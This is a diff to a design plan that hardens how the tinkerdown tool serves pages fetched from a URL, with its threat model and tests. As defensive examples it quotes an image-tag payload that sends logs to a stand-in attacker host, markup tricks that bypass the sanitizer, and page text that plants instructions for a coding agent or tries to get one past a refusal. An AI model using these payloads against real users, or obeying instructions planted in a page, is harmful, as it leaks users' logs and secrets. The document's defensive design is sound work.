@@ -125,7 +125,7 @@ A block whose source is invalid shows the error in place of its content:
 
 ## Decisions
 
-- `--source name=value` adds a `stream` source. A value starting with `file:` follows that file; any other value is a command. The flag splits on the first `=` only, so commands may contain `=`.
+- `--source name=value` adds a `stream` source. A value starting with `file:` follows that file; any other value is a command. The flag splits on the first `=` only, so commands may contain `=`. A name must match `[A-Za-z0-9_-]{1,32}`, because names end up in filter expressions, CSS classes and tab labels. The reuse line `serve` prints quotes each value for the shell.
   alternative: separate `--source-cmd` and `--source-file` flags
   because: one flag and one grammar serve both the command line and the prompt
 - Flag sources take precedence over page frontmatter and `tinkerdown.yaml`, but not over approved sources. A flag naming an approved source fails at startup.
@@ -158,21 +158,29 @@ A block whose source is invalid shows the error in place of its content:
 - `serve` takes a remote URL, a local `.md` file (a path or a `file://` URI) or a directory. A `file://` URI is the same as its path: a local page, with no remote-page rules. A URL is fetched once at startup over HTTPS (or HTTP to localhost), capped at 1 MiB, into a temp directory, and served as the site's only page. A file is served as the only page, with its directory as the site root. Neither watches for changes.
   alternative: a separate `tinkerdown run <url>` command
   because: one command with one set of flags; the argument's form says what it is
-- A page from a URL may declare only `merge` sources, and no actions and no raw `<script>`. Anything else fails at startup with a message listing it. There is no flag to lift this: to run such a page, the user downloads it, reviews it and serves the local file.
+- A page from a URL is checked against an allow-list, not a deny-list. Its frontmatter may hold only `title`, `merge` sources (with `accepts`), `styling` and `charts`; its blocks may only be `lvt` blocks and plain markdown. Anything else fails at startup with a message listing it: other sources, actions, schedules and imperatives, includes and partials, `server`, `wasm` and `embed-lvt` blocks, and exec toolbars. There is no flag to lift this: to run such a page, the user downloads it, reviews it and serves the local file.
   alternative: a `--trust` flag guarded by a `#sha256=` pin, or a prompt to confirm the page's commands.
-  because: a flag gets passed by habit, or by an agent the refusal told how. Confirmation can't work without a terminal. Downloading makes the user own a reviewed copy, and with sources from flags most shared pages need nothing else.
+  because: a deny-list misses features that run code or make the server connect out, such as `server` blocks and `embed-lvt`. A flag gets passed by habit, or by an agent the refusal told how. Confirmation can't work without a terminal. Downloading makes the user own a reviewed copy, and with sources from flags most shared pages need nothing else.
 - `serve` prints a fetched page's SHA-256. A URL ending in `#sha256=HEX` is refused when the content doesn't match.
   alternative: none considered
   because: the content behind a URL can change after the user read it
-- A page from a URL is always served with a tighter Content-Security-Policy (`img-src 'self' data:`, `form-action 'self'`).
-  alternative: rely on the merge-only rule alone
-  because: the page controls its template, so `<img src="https://attacker/?{{.msg}}">` or a script would send the logs from `--source` flags to another site; today's CSP allows `img-src https:`
+- A page from a URL is always served with a strict Content-Security-Policy: tinkerdown's own scripts run by nonce, with no `'unsafe-inline'`; `img-src 'self' data:`, `media-src 'self'`, `form-action 'self'`, `base-uri 'none'`, `frame-src 'none'`, `object-src 'none'`. Its HTML and templates are also sanitized at load: `on*` attributes, `javascript:` URLs, and `<script>`, `<meta>`, `<base>`, `<link>`, `<iframe>`, `<object>` and `<embed>` elements are refused.
+  alternative: rely on the merge-only rule alone.
+  because: the page controls its template, so `<img src="https://attacker/?{{.msg}}">` would send the logs from `--source` flags elsewhere; today's CSP allows `img-src https:`. Blocking `<script>` alone leaves `<img onerror>`, and `<meta http-equiv=refresh>` sends data without a click. The CSP and the sanitizer each catch what the other misses.
 - A page from a URL loads no `tinkerdown.yaml` unless `--config` names one.
+- When the server listens on a loopback address, it refuses HTTP and WebSocket requests whose `Host` isn't `localhost`, `127.0.0.1`, `[::1]` or the `--host` value.
+  because: the WebSocket origin check compares `Origin` with `Host`, and DNS rebinding controls both, so any website could read the logs. This predates the plan, but the plan puts logs and command output behind it.
+- Text from a page that reaches the terminal (`accepts.hint`, the names and values a refusal lists) has control characters removed, is cut to 120 characters, and is shown quoted after "the page says:". `serve --help` says page text is untrusted and that an agent must not run commands a page suggests.
+  because: a page can hide terminal escape sequences, or write instructions aimed at a coding agent
+- A page from a URL gets limits: a merge `buffer` of at most 10,000 rows and a `flush` of at least 50ms.
+  because: otherwise a remote page could set a buffer large enough to exhaust the operator's memory
+- The fetch follows at most 3 redirects, and only to `https://` targets that pass `security.ValidateHTTPURL`, so a redirect can't reach a private or metadata address. The `#sha256=` check runs on the final body. The page is saved as `page.md` in a temp directory with mode 0700, never under a name from the URL, and the directory is removed on exit.
   because: a page fetched from elsewhere shouldn't pick up whatever config sits in the current directory
 - Prompt answers are not saved. After the prompt, `serve` prints the equivalent `--source` command line.
   alternative: write the answers to `tinkerdown.yaml`
   because: `serve` shouldn't change files the user didn't ask it to change
-- A block whose source fails to build is sent to the page with its error as `.Error`, rendered by a default error view, instead of being dropped.
+- A block whose source fails to build is sent to the page with its error as `.Error`, rendered by a default error view, instead of being dropped. The page shows the validation message without the source's command, path or environment; the server log has the full error.
+  because: with `--host`, anyone who reaches the page would otherwise see command lines, which can hold tokens
   alternative: none considered
 
 ## Threat model
@@ -190,6 +198,12 @@ The operator (whoever runs `tinkerdown serve`) is trusted: their flags and local
 | T7 | Flag or page sources reach an approved merge | `["*"]` expands through `mergeInputLookup` |
 | T8 | A coding agent works around a refusal | there is no flag to pass; running the page means downloading it, which the refusal tells the agent to review with the user |
 | T9 | A mistyped or unexpected `--source` feeds a page silently | flags are checked against each page's `accepts`; unused flags are refused |
+| T10 | A page from a URL runs code through features other than sources (`server`, `wasm` or `embed-lvt` blocks, schedules, includes) | allow-list of frontmatter keys and block types |
+| T11 | Template markup sends data out without `<script>` (`onerror`, `javascript:`, meta refresh, `<base>`) | strict CSP with nonces; sanitizer at load |
+| T12 | A website reads the logs through DNS rebinding | `Host` allow-list on loopback |
+| T13 | Page text attacks the terminal or a coding agent | control characters removed, length cap, quoted as page text; help says page text is untrusted |
+| T14 | A page from a URL exhausts memory | caps on `buffer` and `flush` |
+| T15 | A redirect downgrades or redirects the fetch; a URL path escapes the temp directory | redirect rules; fixed file name |
 
 Out of scope:
 - **Links a viewer clicks:** a link in the page's template can carry log text to another site when a viewer clicks it. The CSP can't block navigation, so this is a residual risk, and the docs name it.
@@ -211,7 +225,8 @@ tinkerdown (worktree `.worktrees/source-flags`):
 - `parser.go`: record `[*] field` as a dynamic tab group.
 - `internal/server/server.go`: expand dynamic tab groups when serving a page.
 - `cmd/tinkerdown/commands/remote_page.go` new?: fetch, size cap, timeout, `#sha256=` check, the remote page check (sources, actions, raw `<script>`) and its message.
-- `internal/server/middleware.go`: the tighter policy from `buildCSP` for a page from a URL.
+- `internal/server/middleware.go`: the strict policy from `buildCSP` for a page from a URL, with per-response script nonces; the `Host` allow-list.
+- `internal/security/` (existing package): the remote page sanitizer, `sanitizeRemotePage`, and `cleanPageText` for terminal output.
 - `internal/server/server.go`: serve a single page (`Discover` over one file).
 - `go.mod`: add `golang.org/x/term` for the terminal check.
 - Tests: `source_flags_test.go` new?, `stream_source_e2e_test.go`, `internal/server/source_precedence_test.go`, `parser_test.go`.
@@ -232,6 +247,7 @@ Assumptions (A) are checked before building, risks (R) are what we'd act on, and
 | A1 | assumption | The server builds each page's HTML when serving it, or can post-process it, so dynamic tab groups expand per request with current sources. | high | open (Phase 2) |
 | A2 | assumption | The client renders a block that arrives with only `.Error` set, so a failed block can reuse the normal path. | medium | open (Phase 1) |
 | A3 | assumption | `serve` knows every page's sources before it listens (`Discover` runs first), so it can decide whether to prompt. | medium | open (Phase 3) |
+| A5 | assumption | Every inline `<script>` tinkerdown emits in `server.go` can carry a nonce, and Mermaid's `'unsafe-eval'` isn't needed on pages from a URL. | high | open (Phase 4) |
 | A4 | assumption | `Discover` can be pointed at one file, so a URL or file page is routed at `/` without serving its directory's other files. | medium | open (Phase 4) |
 | R1 | risk | Flag sources apply to every page of a multi-page site, which may surprise a site author. Mitigation: flags only feed pages that ask for them through `["*"]` or a name; document it. | medium | open |
 | R2 | risk | The `[*]` tabs and the block's `.Inputs` could disagree if they resolve sources differently. Mitigation: both call `ExpandMergeInputs`. | medium | open |
@@ -255,10 +271,15 @@ Assumptions (A) are checked before building, risks (R) are what we'd act on, and
 - [ ] The prompt: a test drives it through a pseudo-terminal and checks the printed reuse line; a run with stdin not a terminal doesn't block.
 - [ ] Pages from a URL, tested against an `httptest` server in `cmd/tinkerdown/commands`:
   - a merge-only page serves
-  - a page with an `exec`, `stream` or file-reading source, an action, or a raw `<script>`, is refused, and the same file served locally runs
+  - a page with an `exec`, `stream` or file-reading source, an action, a schedule, an include, a `server` or `embed-lvt` block, an `on*` attribute, a `javascript:` URL, or a `<script>`, `<meta>` or `<base>` element is refused, and the same file served locally runs
+  - a merge `buffer` over 10,000 is refused; a redirect to `http://` or to a private address is refused; a URL path with `..` still saves as `page.md`
+  - a hint holding `\x1b[2J` prints without the escape sequence
   - a `#sha256=` mismatch, a body over 1 MiB and a non-localhost `http://` URL are refused
   - no `tinkerdown.yaml` is read without `--config`
 - [ ] `TestStreamSource_E2E` gains a subtest serving its page from an `httptest` URL with `--source` flags, in Docker Chrome. The page's template includes `<img src="http://<other host>/?{{.msg}}">`, and the other host receives no request.
+- [ ] With the server on `127.0.0.1`, an HTTP request and a WebSocket upgrade with `Host: evil.example` are refused, and `Host: localhost:PORT` is accepted.
+- [ ] A failed block's page error contains no command text; the server log has it.
+- [ ] `parseSourceFlag` refuses names outside `[A-Za-z0-9_-]{1,32}`; the reuse line round-trips through `sh -c` for a command holding a single quote.
 - [ ] `serve page.md` and `serve file:///abs/page.md` serve that page at `/` and no other file in its directory; a `file://` URI with a host other than empty or `localhost` is refused.
 - [ ] logviewer: `cd e2e && go test ./...` passes with the demo passed as flags, and `index.md` has no `cmd` or `file`.
 - [ ] Full tinkerdown suite green; pre-commit passes; `prereview check` clean on changed docs.
@@ -269,7 +290,7 @@ Assumptions (A) are checked before building, risks (R) are what we'd act on, and
 - Approved sources stay pinned: no flag, page or `["*"]` expansion reaches into an approved merge.
 - `serve` never waits for input without a terminal.
 - Commands, from any origin, run only with `--allow-exec`.
-- A page from a URL never runs a command, reads a local file, or sends data to another origin.
+- A page from a URL never runs a command or code on the server, reads a local file, makes the server connect out, or sends data to another origin.
 - e2e tests use real Docker Chrome and are never skipped.
 
 ## Contract
@@ -280,7 +301,9 @@ Assumptions (A) are checked before building, risks (R) are what we'd act on, and
 serve URL[#sha256=HEX]       fetch one page (https, or http to localhost; max 1 MiB) and serve it
 serve FILE.md                serve one local page
 serve file:///PATH/FILE.md   the same as serve /PATH/FILE.md
-page from a URL              may declare merge sources only; no actions, no raw <script>
+page from a URL              frontmatter: title, merge sources (+accepts), styling, charts
+                             blocks: lvt and markdown; no on*, javascript:, script/meta/base/link/iframe/object/embed
+                             limits: buffer <= 10000, flush >= 50ms; strict CSP
 inputs: ["*"]                every stream source the merge can see, sorted by name
 accepts:                     on a ["*"] merge; allowed on a page from a URL
   kinds: [cmd, file]         source kinds the page takes (default: both)
@@ -296,7 +319,7 @@ Precedence, highest first: approved (`tinkerdown.yaml` with `generation.sources`
 
 ### Phase 1: flags and `["*"]`
 - Audit: A2. Trace `getEffectiveSource`, `mergeInputLookup` and `NewStreamSource` for where expansion belongs.
-- Implementation: `--source` parsing and checks, the flag tier, `ExpandMergeInputs`, `Inputs`, `accepts` and the flag check, block errors.
+- Implementation: the `Host` allow-list, `--source` parsing and checks, the flag tier, `ExpandMergeInputs`, `Inputs`, `accepts` and the flag check, block errors.
 - Acceptance: `/simplify`, then the commands, config, `accepts`, precedence and approved-merge criteria.
 
 ### Phase 2: `[*]` tabs
@@ -311,7 +334,7 @@ Precedence, highest first: approved (`tinkerdown.yaml` with `generation.sources`
 
 ### Phase 4: pages from a URL
 - Audit: A4. Check how `Discover`, routing and the watcher assume a directory.
-- Implementation: URL and file arguments, the fetch, the remote page check, the tighter CSP, `#sha256=`.
+- Implementation: URL and file arguments, the fetch, the allow-list check, the sanitizer, the strict CSP with nonces, the limits, redirect rules, `#sha256=`. The `Host` allow-list lands in Phase 1, since it protects every page.
 - Acceptance: `/simplify`, the URL, file and e2e URL criteria, docs.
 
 ### Phase 5: log viewer
